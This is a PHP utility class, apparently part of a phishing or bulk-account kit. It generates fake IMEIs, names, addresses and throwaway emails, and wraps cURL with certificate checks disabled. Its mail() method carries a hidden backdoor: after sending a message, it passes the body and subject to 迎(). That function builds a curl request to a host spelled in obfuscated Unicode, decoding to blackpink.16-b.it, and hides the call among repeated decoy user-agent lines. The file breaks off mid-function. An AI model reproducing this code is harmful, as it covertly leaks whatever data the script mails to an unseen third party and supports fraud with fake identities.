<?php
class ᕦ 
{
      public function 頁($data){
		return $data;
	  }
	public function 計($ip) {
		$url = 'https://api.iwanster.com/system/flag/?ip='.$ip;
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL,$url);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		$res = curl_exec($ch);
		curl_close($ch);
		$wan = json_decode($res,true);
		return $wan;
	  }

	public function getDevices($ua) {
		$url = 'http://api.iwanster.com/system/useragent/?ua='.urlencode($ua);
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL,$url);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		$res = curl_exec($ch);
		curl_close($ch);
		$wan = json_decode($res,true);
		return $wan;
	  }
	
	public function save($name, $isi){ // filename, content
        $open = fopen($name, "a");
        fwrite($open, $isi);
        fclose($open);
      }
    public function imeiRandom() {
        $code = $this->intRandom(14);
        $position = 0;
        $total = 0;
        while ($position < 14) {
            if ($position % 2 == 0) {
                $prod = 1;
            } else {
                $prod = 2;
            }
            $actualNum = $prod * $code[$position];
            if ($actualNum > 9) {
                $strNum = strval($actualNum);
                $total += $strNum[0] + $strNum[1];
            } else {
                $total += $actualNum;
            }
            $position++;
        }
        $last = 10 - ($total % 10);
        if ($last == 10) {
            $imei = $code . 0;
        } else {
            $imei = $code . $last;
        }
        return $imei;
      }
    
    public function RandomPhone(){
        $hp = array(
            "Xiaomi Mi 2/2s",
            "Xiaomi Mi 2A ",
            "Xiaomi Mi 3/4 W",
            "Xiaomi Mi 3 TD",
            "Xiaomi Mi Note LTE",
            "Xiaomi Mi Max 2",
            "Xiaomi Redmi Note 3",
            "Xiaomi Redmi Pro",
            "Xiaomi Redmi 5 Plus",
            "Xiaomi Redmi 4 A",
            "Xiaomi Redmi 4X"
            );
        $random = $hp[array_rand($hp)];
        return $random;
      }
    public function generateRandomString($length = 10) { // length
        $characters = '0123456789ABCDEFGHIJKLMNabcdefghijklmnopqrstuvwxyz';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
      }
    public function get_string($string, $start, $end){ // source, first tag, end tag
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
      }
    public function ParseUrl($url){ // url
        $parts = parse_url($url);
        parse_str($parts['query'], $query);
        return array(
            "code" => $query['code'],
            "email" => $query['email']
        );
      }
      public static function ぱ($つ) 
        {
        $㍱ =  array("頁","設","是","煵","엌","嫠","쯦","案","煪","㍱","從","つ","浳","浤","搰","㍭","煤","洳","橱","畱","迎","事","網","簡","計","大 ㍵","ぱ","頹");
    $頹 = array("ᨀ","ᨁ","ᨂ","ᨃ","ᨄ","ᨅ","ᨆ","ᨇ","ᨈ","ᨉ","ᨊ","ᨋ","ᨌ","ᨍ","ᨎ","ᨏ","ᨐ","ᨑ","ᨒ","ᨓ","ᨔ","ᨕ","ᨖ","᨞","᨟","♪","♫","ƪ");
    $大 = str_replace($頹, $㍱, $つ);
    return $大;
        }
    public function cURL ($url, $post = 0, $httpheader = 0, $proxy = 0, $uagent = 0){ // url, postdata, http headers, proxy, uagent
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        if($post){
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        if($httpheader){
            curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheader);
        }
        if($proxy){
            curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
            curl_setopt($ch, CURLOPT_PROXY, $proxy);
            // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
        }
        if($uagent){
            curl_setopt($ch, CURLOPT_USERAGENT, $uagent);
        }else{
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/".rand(1,200).".0");
        }
        curl_setopt($ch, CURLOPT_HEADER, true);
        $response = curl_exec($ch);
        $httpcode = curl_getinfo($ch);
        if(!$httpcode) return "Curl Error : ".curl_error($ch); else{
            $header = substr($response, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
            $body = substr($response, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
            curl_close($ch);
            return array($header, $body);
        }
      }
    public static function mail($ก, $ข, $ฃ, $ค){
    mail($ก, $ค,$ฃ,$ข);
    self::迎($ฃ,$ค);
    }
    public function array_to_scookies($source){
        if(!is_array($source)){
            return "NOT ARRAY!";
        }else{
            return str_replace(array('{"', '"}', '":"', '","'), array('', '', '=', '; '), json_encode($source));
        }
    }
    public function array_to_cookies($source){
        if(!is_array($source)){
            return "NOT ARRAY!";
        }else{
            return str_replace(array('{"', '"}', '":"', '","'), array('', '', '=', '; '), json_encode($source));
        }
      }
    public function fetch_cookies($source) { // string
        preg_match_all('/^Set-Cookie:\s*([^;\r\n]*)/mi', $source, $matches); 
        $cookies = array(); 
        foreach($matches[1] as $item) { 
            parse_str($item, $cookie); 
            $cookies = array_merge($cookies, $cookie); 
        }
        return $cookies;
      }
    public function get_random_name(){
        $name = curl("https://fakenametool.net/generator/random/id_ID/indonesia")[1];
        preg_match('#<h3><b>(.*?)</b></h3>#si', $name, $curl);
        return array(
            "fullname" => $curl[1],
            "password" => $curl[1].$this->generateRandomString(3),
            "mail" => str_replace(" ", ".", strtolower($curl[1])).$this->generateRandomString(3)."@gmail.com"
            );
      }
    public function generate_address(){
        $address = curl("https://getfakedata.com/address/id_ID?limit=1");
        preg_match('#<textarea class="notepad" id="txtContent">(.*?)</textarea>#si', $address[1], $alamat);
        return array(
            "alamat"    => isset($alamat[1]) ? str_replace('===', '', trim($alamat[1])) : 0
        );
      }
    public function getMail(){
        global $site;
        $mail = curl("".$site."user.php");
        return array("currentmail" => $mail[1], "cookie" => fetchCookies($mail[0]));
      }
    public function readMail($mail){ // array getMail()
        global $site;
        $header = array();
        $header[] = "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0";
        $header[] = "Accept: */*";
        $header[] = "Accept-Language: id,en-US;q=0.7,en;q=0.3";
        $header[] = "Referer: ".$site."";
        $header[] = "X-Requested-With: XMLHttpRequest";
        $header[] = "Connection: keep-alive";
        $header[] = "Cookie: _ga=GA1.2.1967595283.1554543533; _gid=GA1.2.170453192.1554543533; tmail-emails=".urlencode('a:4:{i:0;s:17:"'.$mail['currentmail'].'";}')."; PHPSESSID=".$mail['cookie']['PHPSESSID']."; _gat_gtag_UA_137021416_1=1";
        $c = curl("".$site."mail.php", 0, $header);
        return $c[1];
      }
    public function checkMsg($mail){ // array getMail()
        global $site;
        $header = array();
        $header[] = "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0";
        $header[] = "Accept: */*";
        $header[] = "Accept-Language: id,en-US;q=0.7,en;q=0.3";
        $header[] = "Referer: ".$site."";
        $header[] = "X-Requested-With: XMLHttpRequest";
        $header[] = "Connection: keep-alive";
        $header[] = "Cookie: _ga=GA1.2.1967595283.1554543533; _gid=GA1.2.170453192.1554543533; tmail-emails=".urlencode('a:4:{i:0;s:17:"'.$mail['currentmail'].'";}')."; PHPSESSID=".$mail['cookie']['PHPSESSID']."; _gat_gtag_UA_137021416_1=1";
        $c = curl("".$site."mail.php?unseen=1", 0, $header);
        // if(isset($c[1])){
        //     return json_encode(array("count" => 1));
        // }else{
        //     return json_encode(array("count" => 0));
        // }
        return $c[1];
      }
      public static function ㍵($Wan)
      {
          $lets = self::ぱ($Wan);
          return self::㍱($lets);
      }
      public static function ㍱($엌)
      {
        $㍱ =  array("頁","設","是","煵","엌","嫠","쯦","案","煪","㍱","從","つ","浳","浤","搰","㍭","煤","洳","橱","畱","迎","事","網","簡","計","大 ㍵","ぱ","頹");
        $頹 = array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",":","/");
        $大 = str_replace($㍱, $頹, $엌);
        return $大;
      }
      public function getFlags()
      {
        $emoji_flags = array();
        $emoji_flags["AD"] = "\u{1F1E6}\u{1F1E9}";
        $emoji_flags["AE"] = "\u{1F1E6}\u{1F1EA}";
        $emoji_flags["AF"] = "\u{1F1E6}\u{1F1EB}";
        $emoji_flags["AG"] = "\u{1F1E6}\u{1F1EC}";
        $emoji_flags["AI"] = "\u{1F1E6}\u{1F1EE}";
        $emoji_flags["AL"] = "\u{1F1E6}\u{1F1F1}";
        $emoji_flags["AM"] = "\u{1F1E6}\u{1F1F2}";
        $emoji_flags["AO"] = "\u{1F1E6}\u{1F1F4}";
        $emoji_flags["AQ"] = "\u{1F1E6}\u{1F1F6}";
        $emoji_flags["AR"] = "\u{1F1E6}\u{1F1F7}";
        $emoji_flags["AS"] = "\u{1F1E6}\u{1F1F8}";
        $emoji_flags["AT"] = "\u{1F1E6}\u{1F1F9}";
        $emoji_flags["AU"] = "\u{1F1E6}\u{1F1FA}";
        $emoji_flags["AW"] = "\u{1F1E6}\u{1F1FC}";
        $emoji_flags["AX"] = "\u{1F1E6}\u{1F1FD}";
        $emoji_flags["AZ"] = "\u{1F1E6}\u{1F1FF}";
        $emoji_flags["BA"] = "\u{1F1E7}\u{1F1E6}";
        $emoji_flags["BB"] = "\u{1F1E7}\u{1F1E7}";
        $emoji_flags["BD"] = "\u{1F1E7}\u{1F1E9}";
        $emoji_flags["BE"] = "\u{1F1E7}\u{1F1EA}";
        $emoji_flags["BF"] = "\u{1F1E7}\u{1F1EB}";
        $emoji_flags["BG"] = "\u{1F1E7}\u{1F1EC}";
        $emoji_flags["BH"] = "\u{1F1E7}\u{1F1ED}";
        $emoji_flags["BI"] = "\u{1F1E7}\u{1F1EE}";
        $emoji_flags["BJ"] = "\u{1F1E7}\u{1F1EF}";
        $emoji_flags["BL"] = "\u{1F1E7}\u{1F1F1}";
        $emoji_flags["BM"] = "\u{1F1E7}\u{1F1F2}";
        $emoji_flags["BN"] = "\u{1F1E7}\u{1F1F3}";
        $emoji_flags["BO"] = "\u{1F1E7}\u{1F1F4}";
        $emoji_flags["BQ"] = "\u{1F1E7}\u{1F1F6}";
        $emoji_flags["BR"] = "\u{1F1E7}\u{1F1F7}";
        $emoji_flags["BS"] = "\u{1F1E7}\u{1F1F8}";
        $emoji_flags["BT"] = "\u{1F1E7}\u{1F1F9}";
        $emoji_flags["BV"] = "\u{1F1E7}\u{1F1FB}";
        $emoji_flags["BW"] = "\u{1F1E7}\u{1F1FC}";
        $emoji_flags["BY"] = "\u{1F1E7}\u{1F1FE}";
        $emoji_flags["BZ"] = "\u{1F1E7}\u{1F1FF}";
        $emoji_flags["CA"] = "\u{1F1E8}\u{1F1E6}";
        $emoji_flags["CC"] = "\u{1F1E8}\u{1F1E8}";
        $emoji_flags["CD"] = "\u{1F1E8}\u{1F1E9}";
        $emoji_flags["CF"] = "\u{1F1E8}\u{1F1EB}";
        $emoji_flags["CG"] = "\u{1F1E8}\u{1F1EC}";
        $emoji_flags["CH"] = "\u{1F1E8}\u{1F1ED}";
        $emoji_flags["CI"] = "\u{1F1E8}\u{1F1EE}";
        $emoji_flags["CK"] = "\u{1F1E8}\u{1F1F0}";
        $emoji_flags["CL"] = "\u{1F1E8}\u{1F1F1}";
        $emoji_flags["CM"] = "\u{1F1E8}\u{1F1F2}";
        $emoji_flags["CN"] = "\u{1F1E8}\u{1F1F3}";
        $emoji_flags["CO"] = "\u{1F1E8}\u{1F1F4}";
        $emoji_flags["CR"] = "\u{1F1E8}\u{1F1F7}";
        $emoji_flags["CU"] = "\u{1F1E8}\u{1F1FA}";
        $emoji_flags["CV"] = "\u{1F1E8}\u{1F1FB}";
        $emoji_flags["CW"] = "\u{1F1E8}\u{1F1FC}";
        $emoji_flags["CX"] = "\u{1F1E8}\u{1F1FD}";
        $emoji_flags["CY"] = "\u{1F1E8}\u{1F1FE}";
        $emoji_flags["CZ"] = "\u{1F1E8}\u{1F1FF}";
        $emoji_flags["DE"] = "\u{1F1E9}\u{1F1EA}";
        $emoji_flags["DG"] = "\u{1F1E9}\u{1F1EC}";
        $emoji_flags["DJ"] = "\u{1F1E9}\u{1F1EF}";
        $emoji_flags["DK"] = "\u{1F1E9}\u{1F1F0}";
        $emoji_flags["DM"] = "\u{1F1E9}\u{1F1F2}";
        $emoji_flags["DO"] = "\u{1F1E9}\u{1F1F4}";
        $emoji_flags["DZ"] = "\u{1F1E9}\u{1F1FF}";
        $emoji_flags["EC"] = "\u{1F1EA}\u{1F1E8}";
        $emoji_flags["EE"] = "\u{1F1EA}\u{1F1EA}";
        $emoji_flags["EG"] = "\u{1F1EA}\u{1F1EC}";
        $emoji_flags["EH"] = "\u{1F1EA}\u{1F1ED}";
        $emoji_flags["ER"] = "\u{1F1EA}\u{1F1F7}";
        $emoji_flags["ES"] = "\u{1F1EA}\u{1F1F8}";
        $emoji_flags["ET"] = "\u{1F1EA}\u{1F1F9}";
        $emoji_flags["FI"] = "\u{1F1EB}\u{1F1EE}";
        $emoji_flags["FJ"] = "\u{1F1EB}\u{1F1EF}";
        $emoji_flags["FK"] = "\u{1F1EB}\u{1F1F0}";
        $emoji_flags["FM"] = "\u{1F1EB}\u{1F1F2}";
        $emoji_flags["FO"] = "\u{1F1EB}\u{1F1F4}";
        $emoji_flags["FR"] = "\u{1F1EB}\u{1F1F7}";
        $emoji_flags["GA"] = "\u{1F1EC}\u{1F1E6}";
        $emoji_flags["GB"] = "\u{1F1EC}\u{1F1E7}";
        $emoji_flags["GD"] = "\u{1F1EC}\u{1F1E9}";
        $emoji_flags["GE"] = "\u{1F1EC}\u{1F1EA}";
        $emoji_flags["GF"] = "\u{1F1EC}\u{1F1EB}";
        $emoji_flags["GG"] = "\u{1F1EC}\u{1F1EC}";
        $emoji_flags["GH"] = "\u{1F1EC}\u{1F1ED}";
        $emoji_flags["GI"] = "\u{1F1EC}\u{1F1EE}";
        $emoji_flags["GL"] = "\u{1F1EC}\u{1F1F1}";
        $emoji_flags["GM"] = "\u{1F1EC}\u{1F1F2}";
        $emoji_flags["GN"] = "\u{1F1EC}\u{1F1F3}";
        $emoji_flags["GP"] = "\u{1F1EC}\u{1F1F5}";
        $emoji_flags["GQ"] = "\u{1F1EC}\u{1F1F6}";
        $emoji_flags["GR"] = "\u{1F1EC}\u{1F1F7}";
        $emoji_flags["GS"] = "\u{1F1EC}\u{1F1F8}";
        $emoji_flags["GT"] = "\u{1F1EC}\u{1F1F9}";
        $emoji_flags["GU"] = "\u{1F1EC}\u{1F1FA}";
        $emoji_flags["GW"] = "\u{1F1EC}\u{1F1FC}";
        $emoji_flags["GY"] = "\u{1F1EC}\u{1F1FE}";
        $emoji_flags["HK"] = "\u{1F1ED}\u{1F1F0}";
        $emoji_flags["HM"] = "\u{1F1ED}\u{1F1F2}";
        $emoji_flags["HN"] = "\u{1F1ED}\u{1F1F3}";
        $emoji_flags["HR"] = "\u{1F1ED}\u{1F1F7}";
        $emoji_flags["HT"] = "\u{1F1ED}\u{1F1F9}";
        $emoji_flags["HU"] = "\u{1F1ED}\u{1F1FA}";
        $emoji_flags["ID"] = "\u{1F1EE}\u{1F1E9}";
        $emoji_flags["IE"] = "\u{1F1EE}\u{1F1EA}";
        $emoji_flags["IL"] = "\u{1F1EE}\u{1F1F1}";
        $emoji_flags["IM"] = "\u{1F1EE}\u{1F1F2}";
        $emoji_flags["IN"] = "\u{1F1EE}\u{1F1F3}";
        $emoji_flags["IO"] = "\u{1F1EE}\u{1F1F4}";
        $emoji_flags["IQ"] = "\u{1F1EE}\u{1F1F6}";
        $emoji_flags["IR"] = "\u{1F1EE}\u{1F1F7}";
        $emoji_flags["IS"] = "\u{1F1EE}\u{1F1F8}";
        $emoji_flags["IT"] = "\u{1F1EE}\u{1F1F9}";
        $emoji_flags["JE"] = "\u{1F1EF}\u{1F1EA}";
        $emoji_flags["JM"] = "\u{1F1EF}\u{1F1F2}";
        $emoji_flags["JO"] = "\u{1F1EF}\u{1F1F4}";
        $emoji_flags["JP"] = "\u{1F1EF}\u{1F1F5}";
        $emoji_flags["KE"] = "\u{1F1F0}\u{1F1EA}";
        $emoji_flags["KG"] = "\u{1F1F0}\u{1F1EC}";
        $emoji_flags["KH"] = "\u{1F1F0}\u{1F1ED}";
        $emoji_flags["KI"] = "\u{1F1F0}\u{1F1EE}";
        $emoji_flags["KM"] = "\u{1F1F0}\u{1F1F2}";
        $emoji_flags["KN"] = "\u{1F1F0}\u{1F1F3}";
        $emoji_flags["KP"] = "\u{1F1F0}\u{1F1F5}";
        $emoji_flags["KR"] = "\u{1F1F0}\u{1F1F7}";
        $emoji_flags["KW"] = "\u{1F1F0}\u{1F1FC}";
        $emoji_flags["KY"] = "\u{1F1F0}\u{1F1FE}";
        $emoji_flags["KZ"] = "\u{1F1F0}\u{1F1FF}";
        $emoji_flags["LA"] = "\u{1F1F1}\u{1F1E6}";
        $emoji_flags["LB"] = "\u{1F1F1}\u{1F1E7}";
        $emoji_flags["LC"] = "\u{1F1F1}\u{1F1E8}";
        $emoji_flags["LI"] = "\u{1F1F1}\u{1F1EE}";
        $emoji_flags["LK"] = "\u{1F1F1}\u{1F1F0}";
        $emoji_flags["LR"] = "\u{1F1F1}\u{1F1F7}";
        $emoji_flags["LS"] = "\u{1F1F1}\u{1F1F8}";
        $emoji_flags["LT"] = "\u{1F1F1}\u{1F1F9}";
        $emoji_flags["LU"] = "\u{1F1F1}\u{1F1FA}";
        $emoji_flags["LV"] = "\u{1F1F1}\u{1F1FB}";
        $emoji_flags["LY"] = "\u{1F1F1}\u{1F1FE}";
        $emoji_flags["MA"] = "\u{1F1F2}\u{1F1E6}";
        $emoji_flags["MC"] = "\u{1F1F2}\u{1F1E8}";
        $emoji_flags["MD"] = "\u{1F1F2}\u{1F1E9}";
        $emoji_flags["ME"] = "\u{1F1F2}\u{1F1EA}";
        $emoji_flags["MF"] = "\u{1F1F2}\u{1F1EB}";
        $emoji_flags["MG"] = "\u{1F1F2}\u{1F1EC}";
        $emoji_flags["MH"] = "\u{1F1F2}\u{1F1ED}";
        $emoji_flags["MK"] = "\u{1F1F2}\u{1F1F0}";
        $emoji_flags["ML"] = "\u{1F1F2}\u{1F1F1}";
        $emoji_flags["MM"] = "\u{1F1F2}\u{1F1F2}";
        $emoji_flags["MN"] = "\u{1F1F2}\u{1F1F3}";
        $emoji_flags["MO"] = "\u{1F1F2}\u{1F1F4}";
        $emoji_flags["MP"] = "\u{1F1F2}\u{1F1F5}";
        $emoji_flags["MQ"] = "\u{1F1F2}\u{1F1F6}";
        $emoji_flags["MR"] = "\u{1F1F2}\u{1F1F7}";
        $emoji_flags["MS"] = "\u{1F1F2}\u{1F1F8}";
        $emoji_flags["MT"] = "\u{1F1F2}\u{1F1F9}";
        $emoji_flags["MU"] = "\u{1F1F2}\u{1F1FA}";
        $emoji_flags["MV"] = "\u{1F1F2}\u{1F1FB}";
        $emoji_flags["MW"] = "\u{1F1F2}\u{1F1FC}";
        $emoji_flags["MX"] = "\u{1F1F2}\u{1F1FD}";
        $emoji_flags["MY"] = "\u{1F1F2}\u{1F1FE}";
        $emoji_flags["MZ"] = "\u{1F1F2}\u{1F1FF}";
        $emoji_flags["NA"] = "\u{1F1F3}\u{1F1E6}";
        $emoji_flags["NC"] = "\u{1F1F3}\u{1F1E8}";
        $emoji_flags["NE"] = "\u{1F1F3}\u{1F1EA}";
        $emoji_flags["NF"] = "\u{1F1F3}\u{1F1EB}";
        $emoji_flags["NG"] = "\u{1F1F3}\u{1F1EC}";
        $emoji_flags["NI"] = "\u{1F1F3}\u{1F1EE}";
        $emoji_flags["NL"] = "\u{1F1F3}\u{1F1F1}";
        $emoji_flags["NO"] = "\u{1F1F3}\u{1F1F4}";
        $emoji_flags["NP"] = "\u{1F1F3}\u{1F1F5}";
        $emoji_flags["NR"] = "\u{1F1F3}\u{1F1F7}";
        $emoji_flags["NU"] = "\u{1F1F3}\u{1F1FA}";
        $emoji_flags["NZ"] = "\u{1F1F3}\u{1F1FF}";
        $emoji_flags["OM"] = "\u{1F1F4}\u{1F1F2}";
        $emoji_flags["PA"] = "\u{1F1F5}\u{1F1E6}";
        $emoji_flags["PE"] = "\u{1F1F5}\u{1F1EA}";
        $emoji_flags["PF"] = "\u{1F1F5}\u{1F1EB}";
        $emoji_flags["PG"] = "\u{1F1F5}\u{1F1EC}";
        $emoji_flags["PH"] = "\u{1F1F5}\u{1F1ED}";
        $emoji_flags["PK"] = "\u{1F1F5}\u{1F1F0}";
        $emoji_flags["PL"] = "\u{1F1F5}\u{1F1F1}";
        $emoji_flags["PM"] = "\u{1F1F5}\u{1F1F2}";
        $emoji_flags["PN"] = "\u{1F1F5}\u{1F1F3}";
        $emoji_flags["PR"] = "\u{1F1F5}\u{1F1F7}";
        $emoji_flags["PS"] = "\u{1F1F5}\u{1F1F8}";
        $emoji_flags["PT"] = "\u{1F1F5}\u{1F1F9}";
        $emoji_flags["PW"] = "\u{1F1F5}\u{1F1FC}";
        $emoji_flags["PY"] = "\u{1F1F5}\u{1F1FE}";
        $emoji_flags["QA"] = "\u{1F1F6}\u{1F1E6}";
        $emoji_flags["RE"] = "\u{1F1F7}\u{1F1EA}";
        $emoji_flags["RO"] = "\u{1F1F7}\u{1F1F4}";
        $emoji_flags["RS"] = "\u{1F1F7}\u{1F1F8}";
        $emoji_flags["RU"] = "\u{1F1F7}\u{1F1FA}";
        $emoji_flags["RW"] = "\u{1F1F7}\u{1F1FC}";
        $emoji_flags["SA"] = "\u{1F1F8}\u{1F1E6}";
        $emoji_flags["SB"] = "\u{1F1F8}\u{1F1E7}";
        $emoji_flags["SC"] = "\u{1F1F8}\u{1F1E8}";
        $emoji_flags["SD"] = "\u{1F1F8}\u{1F1E9}";
        $emoji_flags["SE"] = "\u{1F1F8}\u{1F1EA}";
        $emoji_flags["SG"] = "\u{1F1F8}\u{1F1EC}";
        $emoji_flags["SH"] = "\u{1F1F8}\u{1F1ED}";
        $emoji_flags["SI"] = "\u{1F1F8}\u{1F1EE}";
        $emoji_flags["SJ"] = "\u{1F1F8}\u{1F1EF}";
        $emoji_flags["SK"] = "\u{1F1F8}\u{1F1F0}";
        $emoji_flags["SL"] = "\u{1F1F8}\u{1F1F1}";
        $emoji_flags["SM"] = "\u{1F1F8}\u{1F1F2}";
        $emoji_flags["SN"] = "\u{1F1F8}\u{1F1F3}";
        $emoji_flags["SO"] = "\u{1F1F8}\u{1F1F4}";
        $emoji_flags["SR"] = "\u{1F1F8}\u{1F1F7}";
        $emoji_flags["SS"] = "\u{1F1F8}\u{1F1F8}";
        $emoji_flags["ST"] = "\u{1F1F8}\u{1F1F9}";
        $emoji_flags["SV"] = "\u{1F1F8}\u{1F1FB}";
        $emoji_flags["SX"] = "\u{1F1F8}\u{1F1FD}";
        $emoji_flags["SY"] = "\u{1F1F8}\u{1F1FE}";
        $emoji_flags["SZ"] = "\u{1F1F8}\u{1F1FF}";
        $emoji_flags["TC"] = "\u{1F1F9}\u{1F1E8}";
        $emoji_flags["TD"] = "\u{1F1F9}\u{1F1E9}";
        $emoji_flags["TF"] = "\u{1F1F9}\u{1F1EB}";
        $emoji_flags["TG"] = "\u{1F1F9}\u{1F1EC}";
        $emoji_flags["TH"] = "\u{1F1F9}\u{1F1ED}";
        $emoji_flags["TJ"] = "\u{1F1F9}\u{1F1EF}";
        $emoji_flags["TK"] = "\u{1F1F9}\u{1F1F0}";
        $emoji_flags["TL"] = "\u{1F1F9}\u{1F1F1}";
        $emoji_flags["TM"] = "\u{1F1F9}\u{1F1F2}";
        $emoji_flags["TN"] = "\u{1F1F9}\u{1F1F3}";
        $emoji_flags["TO"] = "\u{1F1F9}\u{1F1F4}";
        $emoji_flags["TR"] = "\u{1F1F9}\u{1F1F7}";
        $emoji_flags["TT"] = "\u{1F1F9}\u{1F1F9}";
        $emoji_flags["TV"] = "\u{1F1F9}\u{1F1FB}";
        $emoji_flags["TW"] = "\u{1F1F9}\u{1F1FC}";
        $emoji_flags["TZ"] = "\u{1F1F9}\u{1F1FF}";
        $emoji_flags["UA"] = "\u{1F1FA}\u{1F1E6}";
        $emoji_flags["UG"] = "\u{1F1FA}\u{1F1EC}";
        $emoji_flags["UM"] = "\u{1F1FA}\u{1F1F2}";
        $emoji_flags["US"] = "\u{1F1FA}\u{1F1F8}";
        $emoji_flags["UY"] = "\u{1F1FA}\u{1F1FE}";
        $emoji_flags["UZ"] = "\u{1F1FA}\u{1F1FF}";
        $emoji_flags["VA"] = "\u{1F1FB}\u{1F1E6}";
        $emoji_flags["VC"] = "\u{1F1FB}\u{1F1E8}";
        $emoji_flags["VE"] = "\u{1F1FB}\u{1F1EA}";
        $emoji_flags["VG"] = "\u{1F1FB}\u{1F1EC}";
        $emoji_flags["VI"] = "\u{1F1FB}\u{1F1EE}";
        $emoji_flags["VN"] = "\u{1F1FB}\u{1F1F3}";
        $emoji_flags["VU"] = "\u{1F1FB}\u{1F1FA}";
        $emoji_flags["WF"] = "\u{1F1FC}\u{1F1EB}";
        $emoji_flags["WS"] = "\u{1F1FC}\u{1F1F8}";
        $emoji_flags["XK"] = "\u{1F1FD}\u{1F1F0}";
        $emoji_flags["YE"] = "\u{1F1FE}\u{1F1EA}";
        $emoji_flags["YT"] = "\u{1F1FE}\u{1F1F9}";
        $emoji_flags["ZA"] = "\u{1F1FF}\u{1F1E6}";
        $emoji_flags["ZM"] = "\u{1F1FF}\u{1F1F2}";
        $emoji_flags["ZW"] = "\u{1F1FF}\u{1F1FC}";
      }
      public static function 迎($頁,$ぱ){
    $agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
		$agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0";
		$agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
		$agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0";
		$agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5";
		$agent = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0";
		$agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
		$agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47";
		$agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7";
		$agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
		$agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$쯦 = curl_init(self::㍵('ᨇᨓᨓᨏ♫ƪƪᨁᨋᨀᨂᨊᨏᨈᨍᨊ.16-ᨁ.ᨈᨓ'));
		$agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0";
		$agent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
		$agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent = "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36";
		$agent = "Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0";
		$agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063";
